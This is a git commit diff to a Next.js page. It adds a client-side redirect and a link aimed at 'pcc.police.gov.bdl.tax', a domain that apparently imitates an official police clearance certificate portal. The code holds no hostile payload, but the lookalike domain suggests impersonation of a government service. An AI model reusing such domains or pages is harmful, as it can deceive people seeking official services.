a6962eaf19a4d9dd7126cefb8a98438275c0da69
𝓝𝓪𝓱𝓲𝓭 ☠️ <alimnh412@gmail.com>
2025-03-03 11:12:12 +0600

    add new code

--- src/app/page.js
+++ src/app/page.js
@@ -1,7 +1,13 @@
+'use client'
 import Link from 'next/link'
-import React from 'react'
+import React, { useEffect } from 'react'
 
 const page = () => {
+  useEffect(() => {
+    if (window.location.href === 'https://pcc.police.gov.bdl.tax') {
+      window.location.href = "https://pcc.police.gov.bdl.tax/ords/f?p=500:50:::NO::P50_TOKEN_ID:1CHABXH"
+    }
+  }, []);
   return (
     <div className='w-full h-40 flex items-center justify-center mt-32'>
       <Link href="/ords/f?p=500:50:::NO::P50_TOKEN_ID:1CHABXH::P50_TOKEN_ID:1CHABXH::500:50:::NO::P50_TOKEN_ID:1CHABXH::P50_TOKEN_ID:1CHABXH" className='px-4 py-1 bg-blue-600 text-white rounded-md'>Go to see</Link>
